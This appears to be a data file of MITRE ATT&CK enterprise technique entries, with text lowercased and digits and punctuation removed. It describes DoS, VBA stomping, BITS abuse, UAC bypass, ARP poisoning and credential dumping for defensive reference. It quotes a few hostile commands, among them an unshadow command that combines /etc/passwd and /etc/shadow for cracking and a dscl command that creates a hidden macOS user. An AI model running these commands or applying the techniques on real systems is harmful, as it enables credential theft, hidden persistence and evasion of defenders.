attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4,['enterprise-attack'],['T1499'],Endpoint Denial of Service,adversaries may perform endpoint denial of service  dos  attacks to degrade or block the availability of services to users  endpoint dos can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition  example services include websites  email services  dns  and web based applications  adversaries have been observed conducting dos attacks for political purposes citation  fireeye oppoisonedhandover february       and to support other malicious activities  including distraction citation  fsisac fraudnetdos september        hacktivism  and extortion_ citation  symantec ddos october        an endpoint dos denies the availability of a service without saturating the network used to provide access to the service  adversaries can target various layers of the application stack that is hosted on the system used to provide the service  these layers include the operating systems  os   server applications such as web servers  dns servers  databases  and the  typically web based  applications that sit on top of them  attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components  a dos attack may be generated by a single system or multiple systems spread across the internet  which is commonly referred to as a distributed dos  ddos _  to perform dos attacks against endpoint resources  several aspects apply to multiple methods  including ip address spoofing and botnets_  adversaries may use the original ip address of an attacking system  or spoof the source ip address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection  this can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices_  botnets are commonly used to conduct ddos attacks against networks and services  large botnets can generate a significant amount of traffic from systems spread across the global internet  adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack  in some of the worst cases for ddos  so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources  in such circumstances  distinguishing ddos traffic from legitimate clients becomes exceedingly difficult  botnets have been used in some of the most high profile ddos attacks  such as the      series of incidents that targeted major us banks_ citation  usnyag iranianbotnet march        in cases where traffic manipulation is used  there may be points in the global network  such as high traffic gateway routers  where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume  this type of capability was previously used for the purposes of web censorship where client http traffic was modified to include a reference to javascript that generated the ddos code to overwhelm target web servers_ citation  arstechnica great firewall of china   for attacks attempting to saturate the providing network  see  network denial of
attack-pattern--c726e0a2-a57a-4b7b-a973-d0f013246617,['enterprise-attack'],['T1027.004'],Compile After Delivery,adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code  text based source code files may subvert analysis and scrutiny from protections targeting executables binaries  these payloads will need to be compiled before execution  typically via native utilities such as csc_exe or gcc mingw_ citation  clearsky muddywater nov        source code payloads may also be encrypted  encoded  and or embedded within other files  such as those delivered as a  payloads may also be delivered in formats unrecognizable and inherently benign to the native os  ex  exes on macos linux  before later being  re compiled into a proper executable binary with a bundled compiler and execution framework_ citation  trendmicro windowsappmac 
attack-pattern--c848fcf7-6b62-4bde-8216-b6c157d48da0,['enterprise-attack'],['T1065'],Uncommonly Used Port,adversaries may conduct c  communications over a non standard port to bypass proxies and firewalls that have been improperly configured 
attack-pattern--c877e33f-1df6-40d6-b1e7-ce70f16f4979,['enterprise-attack'],['T1614'],System Location Discovery,adversaries may gather information in an attempt to calculate the geographical location of a victim host  adversaries may use the information from  system location  during automated discovery to shape follow on behaviors  including whether or not the adversary fully infects the target and or attempts specific actions_  adversaries may attempt to infer the location of a system using various system checks  such as time zone  keyboard layout  and or language settings_ citation  fbi ragnar locker       citation  sophos geolocation       citation  bleepingcomputer rat malware       windows api functions such as getlocaleinfow can also be used to determine the locale of the host_ citation  fbi ragnar locker       in cloud environments  an instance's availability zone may also be discovered by accessing the instance metadata service from the instance_ citation  aws instance identity documents  citation  microsoft azure instance metadata        adversaries may also attempt to infer the location of a victim host using ip addressing  such as via online geolocation ip lookup services_ citation  securelist trasparent tribe       citation  sophos geolocation      
attack-pattern--c898c4b5-bf36-4e6e-a4ad-5b8c4c13e35b,['enterprise-attack'],['T1564.007'],VBA Stomping,adversaries may hide malicious visual basic for applications  vba  payloads embedded within ms office documents by replacing the vba source code with benign data_ citation  fireeye vba stomp feb        ms office documents with embedded vba content store source code inside of module streams  each module stream has a performancecache that stores a separate compiled version of the vba source code known as p code  the p code is executed when the ms office version specified in the _vba_project stream  which contains the version dependent description of the vba project  matches the version of the host ms office application_ citation  evil clippy may       citation  microsoft _vba_project stream   an adversary may hide malicious vba code by overwriting the vba source code location with zero s  benign code  or random bytes while leaving the previously compiled malicious p code  tools that scan for malicious vba source code may be bypassed as the unwanted code is hidden in the compiled p code  if the vba source code is removed  some tools might even think that there are no macros present  if there is a version match between the _vba_project stream and host ms office application  the p code will be executed  otherwise the benign vba source code will be decompressed and recompiled to p code  thus removing malicious p code and potentially bypassing dynamic analysis_ citation  walmart roberts oct       citation  fireeye vba stomp feb       citation  pcodedmp bontchev 
attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7,['enterprise-attack'],['T1197'],BITS Jobs,adversaries may abuse bits jobs to persistently execute code and perform various background tasks  windows background intelligent transfer service  bits  is a low bandwidth  asynchronous file transfer mechanism exposed through  component object   com _ citation  microsoft com  citation  microsoft bits  bits is commonly used by updaters  messengers  and other applications preferred to operate in the background  using available idle bandwidth  without interrupting other networked applications  file transfer tasks are implemented as bits jobs  which contain a queue of one or more file operations_  the interface to create and manage bits jobs is accessible through  and the  tool_ citation  microsoft bits  citation  microsoft bitsadmin   adversaries may abuse bits to download  e_g   ingress tool  execute  and even clean up after running malicious code  e_g   indicator  bits tasks are self contained in the bits job database  without new files or registry modifications  and often permitted by host firewalls_ citation  ctu bits malware june       citation  mondok windows piggyback bits may       citation  symantec bits may       bits enabled execution may also enable persistence by creating long standing jobs  the default maximum lifetime is    days and extendable  or invoking an arbitrary program when a job completes or errors  including after system reboots _ citation  paloalto uboatrat nov       citation  ctu bits malware june        bits upload functionalities can also be used to perform  exfiltration over alternative  ctu bits malware june      
attack-pattern--c92e3d68-2349-49e4-a341-7edca2deff96,['enterprise-attack'],['T1127.001'],MSBuild,adversaries may use msbuild to proxy execution of code through a trusted windows utility  msbuild_exe  microsoft build engine  is a software build platform used by visual studio  it handles xml formatted project files that define requirements for loading and building various platforms and configurations_ citation  msdn msbuild   adversaries can abuse msbuild to proxy execution of malicious code  the inline task capability of msbuild that was introduced in _net version   allows for c  or visual basic code to be inserted into an xml project file_ citation  msdn msbuild  citation  microsoft msbuild inline tasks       msbuild will compile and execute the inline task  msbuild_exe is a signed microsoft binary  so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow msbuild_exe execution_ citation  lolbas msbuild 
attack-pattern--ca1a3f50-5ebd-41f8-8320-2c7d6a6e88be,['enterprise-attack'],['T1088'],Bypass User Account Control,windows user account control  uac  allows a program to elevate its privileges to perform a task under administrator level permissions by prompting the user for confirmation  the impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action   citation  technet how uac works   if the uac protection level of a computer is set to anything but the highest level  certain windows programs are allowed to elevate privileges or execute some elevated com objects without prompting the user through the uac notification box   citation  technet inside uac   citation  msdn com elevation  an example of this is use of rundll  _exe to load a specifically crafted dll which loads an auto elevated com object and performs a file operation in a protected directory which would typically require elevated access  malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user   citation  davidson windows  adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected_  many methods have been discovered to bypass uac  the github readme page for uacme contains an extensive list of methods  citation  github uacme  that have been discovered and implemented within uacme  but may not be a comprehensive list of bypasses  additional bypass methods are regularly discovered and some used in the wild  such as     eventvwr_exe can auto elevate and execute a specified binary or script   citation  enigma x  fileless uac bypass   citation  fortinet fareit   another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known  since uac is a single system security mechanism  and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity   citation  sans uac bypass 
attack-pattern--ca205a36-c1ad-488b-aa6c-ab34bdd3a36b,['enterprise-attack'],['T1494'],Runtime Data Manipulation,adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user_ citation  fireeye apt   oct       citation  doj lazarus sony       by manipulating runtime data  adversaries may attempt to affect a business process  organizational understanding  and decision making    adversaries may alter application binaries used to display data in order to cause runtime manipulations  adversaries may also conduct  change default file  and  to cause a similar effect  the type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary  for complex systems  an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact 
attack-pattern--ca9d3402-ada3-484d-876a-d717bd6e05f2,['enterprise-attack'],['T1090.004'],Domain Fronting,adversaries may take advantage of routing schemes in content delivery networks  cdns  and other services which host multiple domains to obfuscate the intended destination of https traffic or traffic tunneled through https   citation  fifield blocking resistent communication through domain fronting       domain fronting involves using different domain names in the sni field of the tls header and the host field of the http header  if both domains are served from the same cdn  then the cdn may route to the address specified in the http header after unwrapping the tls header  a variation of the the technique   domainless  fronting  utilizes a sni field that is left blank  this may allow the fronting to work even when the cdn attempts to validate that the sni and http host fields match  if the blank sni fields are ignored _  for example  if domain x and domain y are customers of the same cdn  it is possible to place domain x in the tls header and domain y in the http header  traffic will appear to be going to domain x  however the cdn may route it to domain y 
attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213,['enterprise-attack'],['T1557.002'],ARP Cache Poisoning,adversaries may poison address resolution protocol  arp  caches to position themselves between the communication of two or more networked devices  this activity may be used to enable follow on behaviors such as  network  or  transmitted data   the arp protocol is used to resolve ipv  addresses to link layer addresses  such as a media access control  mac  address_ citation  rfc    arp  devices in a local network segment communicate with each other by using link layer addresses  if a networked device does not have the link layer address of a particular networked device  it may send out a broadcast arp request to the local network to translate the ip address to a mac address  the device with the associated ip address directly replies with its mac address  the networked device that made the arp request will then use as well as store that information in its arp cache_  an adversary may passively wait for an arp request to poison the arp cache of the requesting device  the adversary may reply with their mac address  thus deceiving the victim by making them believe that they are communicating with the intended networked device  for the adversary to poison the arp cache  their reply must be faster than the one made by the legitimate ip address owner  adversaries may also send a gratuitous arp reply that maliciously announces the ownership of a particular ip address to all the devices in the local network segment_  the arp protocol is stateless and does not require authentication  therefore  devices may wrongly add or update the mac address of the ip address in their arp cache_ citation  sans arp spoofing aug       citation  cylance cleaver   adversaries may use arp cache poisoning as a means to intercept network traffic  this activity may be used to collect and or relay data such as credentials  especially those sent over an insecure  unencrypted protocol_ citation  sans arp spoofing aug      
attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d,['enterprise-attack'],['T1562.008'],Disable Cloud Logs,an adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection    cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment  if an adversary has sufficient permissions  they can disable logging to avoid detection of their activities  for example  in aws an adversary may disable cloudwatch cloudtrail integrations prior to conducting further malicious activity_ citation  following the cloudtrail  generating strong aws security signals with sumo logic 
attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384,['enterprise-attack'],['T1518.001'],Security Software Discovery,adversaries may attempt to get a listing of security software  configurations  defensive tools  and sensors that are installed on a system or in a cloud environment  this may include things such as firewall rules and anti virus  adversaries may use the information from  security software  during automated discovery to shape follow on behaviors  including whether or not the adversary fully infects the target and or attempts specific actions_  example commands that can be used to obtain security software information are  reg query with  dir with  and  but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for  it is becoming more common to see macos malware perform checks for littlesnitch and knockknock software_  adversaries may also utilize cloud apis to discover the configurations of firewall rules within an environment_ citation  expel io evil in aws  for example  the permitted ip ranges  ports or user accounts for the inbound outbound rules of security groups  virtual firewalls established within aws for ec  and or vpc instances  can be revealed by the describesecuritygroups action with various request parameters   citation  describesecuritygroups   amazon elastic compute cloud 
attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0,['enterprise-attack'],['T1564.003'],Hidden Window,adversaries may use hidden windows to conceal malicious activity from the plain sight of users  in some cases  windows that would typically be displayed when an application carries out an operation can be hidden  this may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks    on windows  there are a variety of features in scripting languages in windows  such as  jscript  and  visual  to make windows hidden  one example of this is powershell_exe  windowstyle hidden   citation  powershell about        similarly  on macos the configurations for how applications run are listed in property list  plist  files  one of the tags in these files can be apple_awt_uielement  which allows for java applications to prevent the application's icon from appearing in the dock  a common use for this is when applications run in the system tray  but don't also want to show up in the dock_  adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system_ citation  antiquated mac malware 
attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8,['enterprise-attack'],['T1493'],Transmitted Data Manipulation,adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity_ citation  fireeye apt   oct       citation  doj lazarus sony       by manipulating transmitted data  adversaries may attempt to affect a business process  organizational understanding  and decision making    manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information  the type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary  for complex systems  an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact 
attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1,['enterprise-attack'],['T1059.006'],Python,adversaries may abuse python commands and scripts for execution  python is a very popular scripting programming language  with capabilities to perform many functions  python can be executed interactively from the command line  via the python_exe interpreter  or via scripts  _py  that can be written and distributed to different systems  python code can also be compiled into binary executables_  python comes with many built in packages to interact with the underlying system  such as file operations and device i o  adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors 
attack-pattern--cc723aff-ec88-40e3-a224-5af9fd983cc4,['enterprise-attack'],['T1591.004'],Identify Roles,adversaries may gather information about identities and roles within the victim organization that can be used during targeting  information about business roles may reveal a variety of targetable details  including identifiable information for key personnel as well as what data resources they have access to_  adversaries may gather this information in various ways  such as direct elicitation via  phishing for  information about business roles may also be exposed to adversaries via online or other accessible data sets  ex   social  or  search victim owned  threatpost broadvoice leak  gathering this information may reveal opportunities for other forms of reconnaissance  ex   phishing for  or  search open  establishing operational resources  ex   establish  or  compromise  and or initial access  ex 
attack-pattern--cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f,['enterprise-attack'],['T1132'],Data Encoding,adversaries may encode data to make the content of command and control traffic more difficult to detect  command and control  c   information can be encoded using a standard data encoding system  use of data encoding may adhere to existing protocol specifications and includes use of ascii  unicode  base    mime  or other binary to text and character encoding systems_ citation  wikipedia binary to text encoding   citation  wikipedia character encoding  some data encoding systems may also result in data compression  such as gzip 
attack-pattern--cc89ecbd-3d33-4a41-bcca-001e702d18fd,['enterprise-attack'],['T1546.010'],AppInit DLLs,adversaries may establish persistence and or elevate privileges by executing malicious content triggered by appinit dlls loaded into processes  dynamic link libraries  dlls  that are specified in the appinit_dlls value in the registry keys hkey_local_machine software microsoft windows nt currentversion windows or hkey_local_machine software wow    node microsoft windows nt currentversion windows are loaded by user  _dll into every process that loads user  _dll  in practice this is nearly every program  since user  _dll is a very common library   citation  elastic process injection july        similar to process injection  these values can be abused to obtain elevated privileges by causing a malicious dll to be loaded and run in the context of separate processes on the computer   citation  appinit registry  malicious appinit dlls may also provide persistence by continuously being triggered by api activity    the appinit dll functionality is disabled in windows   and later versions when secure boot is enabled   citation  appinit secure boot 
attack-pattern--cca0ccb6-a068-4574-a722-b1556f86833a,['enterprise-attack'],['T1598'],Phishing for Information,adversaries may send phishing messages to elicit sensitive information that can be used during targeting  phishing for information is an attempt to trick targets into divulging information  frequently credentials or other actionable information  phishing for information is different from  in that the objective is gathering data from the victim rather than executing malicious code_  all forms of phishing are electronically delivered social engineering  phishing can be targeted  known as spearphishing  in spearphishing  a specific individual  company  or industry will be targeted by the adversary  more generally  adversaries can conduct non targeted phishing  such as in mass credential harvesting campaigns_  adversaries may also try to obtain information directly through the exchange of emails  instant messages  or other electronic conversation means_ citation  threatpost social media phishing  citation  trendmictro phishing  citation  pcmag fakelogin  citation  sophos attachment  citation  github phishery  phishing for information frequently involves social engineering techniques  such as posing as a source with a reason to collect information  ex   establish  or  compromise  and or sending multiple  seemingly urgent messages 
attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783,['enterprise-attack'],['T1496'],Resource Hijacking,adversaries may leverage the resources of co opted systems in order to solve resource intensive problems  which may impact system and or hosted service availability    one common purpose for resource hijacking is to validate transactions of cryptocurrency networks and earn virtual currency  adversaries may consume enough system resources to negatively impact and or cause affected machines to become unresponsive_ citation  kaspersky lazarus under the hood blog       servers and cloud based systems are common targets because of the high potential for available resources  but user endpoint systems may also be compromised and used for resource hijacking and cryptocurrency mining_ citation  cloudsploit   unused aws regions  containerized environments may also be targeted due to the ease of deployment via exposed apis and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster_ citation  unit    hildegard malware  citation  trend micro exposed docker apis   additionally  some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it s not competing for resources_ citation  trend micro war of crypto miners   adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate  network denial of  campaigns and or to seed malicious torrents 
attack-pattern--cdfc5f0a-9bb9-4352-b896-553cfa2d8fd8,['enterprise-attack'],['T1585'],Establish Accounts,adversaries may create and cultivate accounts with services that can be used during targeting  adversaries can create accounts that can be used to build a persona to further operations  persona development consists of the development of public information  presence  history and appropriate affiliations  this development could be applied to social media  website  or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity_  for operations incorporating social engineering  the utilization of an online persona may be important  these personas may be fictitious or impersonate real people  the persona may exist on a single site or across multiple sites  ex  facebook  linkedin  twitter  google  github  docker hub  etc_   establishing a persona may require development of additional documentation to make them seem real  this could include filling out profile information  developing social networks  or incorporating photos_  establishing accounts can also include the creation of accounts with email providers  which may be directly leveraged for  phishing for  or  mandiant apt  
attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1,['enterprise-attack'],['T1588'],Obtain Capabilities,adversaries may buy and or steal capabilities that can be used during targeting  rather than developing their own capabilities in house  adversaries may purchase  freely download  or steal them  activities may include the acquisition of malware  software  including licenses   exploits  certificates  and information relating to vulnerabilities  adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle_  in addition to downloading free malware  software  and exploits from the internet  adversaries may purchase these capabilities from third party entities  third party entities can include technology companies that specialize in malware and exploits  criminal marketplaces  or from individuals_  in addition to purchasing capabilities  adversaries may steal capabilities from third party entities  including other adversaries   this can include stealing software licenses  malware  ssl tls and code signing certificates  or raiding closed databases of vulnerabilities or exploits 
attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf,['enterprise-attack'],['T1546.002'],Screensaver,adversaries may establish persistence by executing malicious content triggered by user inactivity  screensavers are programs that execute after a configurable time of user inactivity and consist of portable executable  pe  files with a _scr file extension_ citation  wikipedia screensaver  the windows screensaver application scrnsave_scr is located in c  windows system     and c  windows syswow     on    bit windows systems  along with screensavers included with base windows installations_  the following screensaver settings are stored in the registry  hkcu control panel desktop   and could be manipulated to achieve persistence     scrnsave_exe   set to malicious pe path   screensaveactive   set to ' ' to enable the screensaver   screensaverissecure   set to ' ' to not require a password to unlock   screensavetimeout   sets user inactivity timeout before screensaver is executed  adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity_ citation  eset gazer aug      
attack-pattern--ce73ea43-8e77-47ba-9c11-5e9c9c58b9ff,['enterprise-attack'],['T1147'],Hidden Users,every user account in macos has a userid associated with it  when creating a user  you can specify the userid for that account  there is a property value in  library preferences com_apple_loginwindow called hide   users that prevents users with userids     and lower from appearing at the login screen  by using the  create  technique with a userid under     and enabling this property  setting it to yes   an adversary can hide their user accounts much more easily  sudo dscl    create  users username uniqueid      citation  cybereason osx pirrit  
attack-pattern--cf1c2504-433f-4c4e-a1f8-91de45a0318c,['enterprise-attack'],['T1578.002'],Create Cloud Instance,an adversary may create a new instance or virtual machine  vm  within the compute service of a cloud account to evade defenses  creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account  an adversary may  create  of one or more volumes in an account  create a new instance  mount the snapshots  and then apply a less restrictive security policy to collect  data from local  or for  remote data  mandiant m trends        creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances 
attack-pattern--cf7b3a06-8b42-4c33-bbe9-012120027925,['enterprise-attack'],['T1500'],Compile After Delivery,adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code  similar to  obfuscated files or  text based source code files may subvert analysis and scrutiny from protections targeting executables binaries  these payloads will need to be compiled before execution  typically via native utilities such as csc_exe or gcc mingw_ citation  clearsky muddywater nov        source code payloads may also be encrypted  encoded  and or embedded within other files  such as those delivered as a  spearphishing  payloads may also be delivered in formats unrecognizable and inherently benign to the native os  ex  exes on macos linux  before later being  re compiled into a proper executable binary with a bundled compiler and execution framework_ citation  trendmicro windowsappmac 
attack-pattern--cff94884-3b1c-4987-a70b-6d5643c621c3,['enterprise-attack'],['T1213.003'],Code Repositories,adversaries may leverage code repositories to collect valuable information  code repositories are tools services that store source code and automate software builds  they may be hosted internally or privately on third party sites such as github  gitlab  sourceforge  and bitbucket  users typically interact with code repositories through a web application or command line utilities such as git_  once adversaries gain access to a victim network or a private code repository  they may collect sensitive information such as proprietary source code or credentials contained within software's source code   having access to software's source code may allow adversaries to develop  while credentials may provide access to additional resources using  valid  wired uber breach  citation  krebs adobe     note    this is distinct from  code  which focuses on conducting  via public code repositories 
attack-pattern--d0613359-5781-4fd2-b5be-c269270be1f6,['enterprise-attack'],['T1565.002'],Transmitted Data Manipulation,adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity  thus threatening the integrity of the data_ citation  fireeye apt   oct       citation  doj lazarus sony       by manipulating transmitted data  adversaries may attempt to affect a business process  organizational understanding  and decision making_  manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information  the type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary  for complex systems  an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact 
attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4,['enterprise-attack'],['T1003.008'],/etc/passwd and /etc/shadow,adversaries may attempt to dump the contents of  etc passwd and  etc shadow to enable offline password cracking  most modern linux operating systems use a combination of  etc passwd and  etc shadow to store user account information including password hashes in  etc shadow  by default   etc shadow is only readable by the root user_ citation  linux password and shadow file formats   the linux utility  unshadow  can be used to combine the two files in a format suited for password cracking utilities such as john the ripper  citation  nixcraft   john the ripper     usr bin unshadow  etc passwd  etc shadow    tmp crack_password_db
attack-pattern--d10cbd34-42e3-45c0-84d2-535a09849584,['enterprise-attack'],['T1543.001'],Launch Agent,adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence  when a user logs in  a per user launchd process is started which loads the parameters for each launch on demand user agent from the property list  _plist  file found in  system library launchagents   library launchagents  and   library launchagents_ citation  appledocs launch agent daemons  citation  osx keydnap malware   citation  antiquated mac malware  property list files use the label  programarguments   and runatload keys to identify the launch agent's name  executable location  and execution time_ citation  osx_dok malware  launch agents are often installed to perform updates to programs  launch user specified programs at login  or to conduct other developer tasks_   launch agents can also be executed using the  command_   adversaries may install a new launch agent that executes at login by placing a _plist file into the appropriate folders with the runatload or keepalive keys set to true_ citation  sofacy komplex trojan  citation  methods of mac malware persistence  the launch agent name may be disguised by using a name from the related operating system or benign software  launch agents are created with user level privileges and execute with user level permissions_ citation  osx malware detection  citation  oceanlotus for os x 
attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253,['enterprise-attack'],['T1569'],System Services,adversaries may abuse system services or daemons to execute commands or programs  adversaries can execute malicious content by interacting with or creating services either locally or remotely  many services are set to run at boot  which can aid in achieving persistence   create or modify system  but adversaries can also abuse services for one time or temporary execution 
attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62,['enterprise-attack'],['T1059.003'],Windows Command Shell,adversaries may abuse the windows command shell for execution  the windows command shell  is the primary command prompt on windows systems  the windows command prompt can be used to control almost any aspect of a system  with various permission levels required for different subsets of commands  the command prompt can be invoked remotely via  remote  such as  ssh in windows   batch files  ex  _bat or _cmd  also provide the shell with a list of sequential commands to run  as well as normal scripting operations such as conditionals and loops  common uses of batch files include long or repetitive tasks  or the need to run the same set of commands on multiple systems_  adversaries may leverage  to execute various commands and payloads  common uses include  to execute a single command  or abusing  interactively with input and output forwarded over a command and control channel 
attack-pattern--d201d4cc-214d-4a74-a1ba-b3fa09fd4591,['enterprise-attack'],['T1055.009'],Proc Memory,adversaries may inject malicious code into processes via the  proc filesystem in order to evade process based defenses as well as possibly elevate privileges  proc memory injection is a method of executing arbitrary code in the address space of a separate live process    proc memory injection involves enumerating the memory of a process via the  proc filesystem   proc  pid   then crafting a return oriented programming  rop  payload with available gadgets instructions  each running process has its own directory  which includes memory mappings  proc memory injection is commonly performed by overwriting the target processes  stack using memory mappings provided by the  proc filesystem  this information can be used to enumerate offsets  including the stack  and gadgets  or instructions within the program that can be used to build a malicious payload  otherwise hidden by process memory protections such as address space layout randomization  aslr   once enumerated  the target processes  memory map within  proc  pid  maps can be overwritten using dd_ citation  uninformed needle  citation  gds linux injection  citation  dd man    other techniques such as  dynamic linker  may be used to populate a target process with more available gadgets  similar to  process  proc memory injection may target child processes  such as a backgrounded copy of sleep _ citation  gds linux injection    running code in the context of another process may allow access to the process's memory  system network resources  and possibly elevated privileges  execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process 
attack-pattern--d21a2069-23d5-4043-ad6d-64f6b644cb1a,['enterprise-attack'],['T1223'],Compiled HTML File,compiled html files  _chm  are commonly distributed as part of the microsoft html help system  chm files are compressed compilations of various content such as html documents  images  and scripting web related programming languages such vba  jscript  java  and activex   citation  microsoft html help may       chm content is displayed using underlying components of the internet explorer browser  citation  microsoft html help activex  loaded by the html help executable program  hh_exe    citation  microsoft html help executable program   adversaries may abuse this technology to conceal malicious code  a custom chm file containing embedded payloads could be delivered to a victim then triggered by  user  chm execution may also bypass application whitelisting on older and or unpatched systems that do not account for execution of binaries through hh_exe   citation  msitpros chm aug        citation  microsoft cve           aug      
attack-pattern--d245808a-7086-4310-984a-a84aaaa43f8f,['enterprise-attack'],['T1601.001'],Patch System Image,adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses_ citation  killing the myth of cisco ios rootkits   citation  killing ios diversity myth   citation  cisco ios shellcode   citation  cisco ios forensics developments   citation  juniper netscreen of the dead  some network devices are built with a monolithic architecture  where the entire operating system and most of the functionality of the device is contained within a single file   adversaries may change this file in storage  to be loaded in a future boot  or in memory during runtime_  to change the operating system in storage  the adversary will typically use the standard procedures available to device operators  this may involve downloading a new file via typical protocols used on network devices  such as tftp  ftp  scp  or a console connection   the original file may be overwritten  or a new file may be written alongside of it and the device reconfigured to boot to the compromised image_  to change the operating system in memory  the adversary typically can use one of two methods  in the first  the adversary would make use of native debug commands in the original  unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system   this method typically requires administrative level access to the device_  in the second method for changing the operating system in memory  the adversary would make use of the boot loader  the boot loader is the first piece of software that loads when the device starts that  in turn  will launch the operating system   adversaries may use malicious code previously implanted in the boot loader  such as through the  method  to directly manipulate running operating system code in memory   this malicious code in the bootloader provides the capability of direct memory manipulation to the adversary  allowing them to patch the live operating system during runtime_  by modifying the instructions stored in the system image file  adversaries may either weaken existing defenses or provision new capabilities that the device did not have before  examples of existing defenses that can be impeded include encryption  via  weaken  authentication  via  network device  and perimeter defenses  via  network boundary   adding new capabilities for the adversary s purpose include   multi hop  and  port   adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders    when this method is used in conjunction with  downgrade system  one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system   by patching the operating system  the adversary can change this command to instead display the original  higher revision number that they replaced through the system downgrade    when the operating system is patched in storage  this can be achieved in either the resident storage  typically a form of flash memory  which is non volatile  or via  tftp    when the technique is performed on the running operating system in memory and not on the stored copy  this technique will not survive across reboots   however  live memory modification of the operating system can be combined with  to achieve persistence 
attack-pattern--d273434a-448e-4598-8e14-607f4a0d5e27,['enterprise-attack'],['T1558.002'],Silver Ticket,adversaries who have the password hash of a target service account  e_g  sharepoint  mssql  may forge kerberos ticket granting service  tgs  tickets  also known as silver tickets  kerberos tgs tickets are also known as service tickets_ citation  adsecurity silver tickets   silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource  e_g  mssql  and the system that hosts the resource  however  unlike golden tickets  adversaries with the ability to forge silver tickets are able to create tgs tickets without interacting with the key distribution center  kdc   potentially making detection more difficult_ citation  adsecurity detecting forged tickets   password hashes for target services may be obtained using  os credential  or
attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416,['enterprise-attack'],['T1213'],Data from Information Repositories,adversaries may leverage information repositories to mine valuable information  information repositories are tools that allow for storage of information  typically to facilitate collaboration or information sharing between users  and can store a wide variety of data that may aid adversaries in further objectives  or direct access to the target information  adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization    the following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository     policies  procedures  and standards   physical   logical network diagrams   system architecture diagrams   technical system documentation   testing   development credentials   work   project schedules   source code snippets   links to network shares and other internal resources  information stored in a repository may vary based on the specific instance or environment  specific common information repositories include web based platforms such as  and  specific services such as code repositories  iaas databases  enterprise databases  and other storage infrastructure such as sql server 
attack-pattern--d2c4e5ea-dbdf-4113-805a-b1e2a337fb33,['enterprise-attack'],['T1070.009'],Clear Persistence,adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity  this may involve various actions  such as removing services  deleting executables   modify   plist file  or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence_ citation  cylance dust storm   in some instances  artifacts of persistence may also be removed once an adversary s persistence is executed in order to prevent errors with the new instance of the malware_ citation  ncc group team  june      
